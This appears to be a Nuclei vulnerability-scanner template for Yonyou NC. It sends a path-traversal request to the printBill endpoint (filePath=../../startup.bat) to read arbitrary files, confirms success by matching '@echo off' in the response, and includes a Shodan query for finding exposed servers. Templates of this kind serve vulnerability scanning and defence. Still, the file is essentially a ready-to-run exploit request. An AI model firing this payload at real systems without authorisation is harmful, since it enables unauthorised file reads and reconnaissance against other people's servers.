id: Yonyou_NC_printBill_FileRead

info:
  name: Yonyou_NC_printBill_FileRead
  author: HK
  severity: high
  description: 用友NC系统printBill接口存在任意文件读取漏洞
  metadata:
    max-request: 1
    shodan-query: body="Client/Uclient/UClient.dmg"
    verified: true

http:
- raw:
  - |+
    @timeout: 30s
    GET /portal/pt/printpdf/printBill?pageId=login&filePath=../../startup.bat HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36
    Content-Type: application/x-www-form-urlencoded

  max-redirects: 3
  matchers-condition: and
  matchers:
    - type: word
      part: body
      words:
        - '@echo off'